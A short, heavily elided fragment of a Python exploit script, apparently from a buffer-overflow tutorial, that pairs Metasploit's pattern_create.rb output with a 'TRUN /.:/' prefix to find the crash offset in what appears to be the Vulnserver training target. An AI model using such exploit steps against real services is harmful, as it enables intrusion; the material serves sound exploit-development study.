...
#Paste the value from your pattern_create.rb here
#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 (The length is based on the bytes found when fuzzing)
...
try:
	...
	payload = "TRUN /.:/" + offset #The extra characters go in after the TRUN command in order for the program to undesrstand it
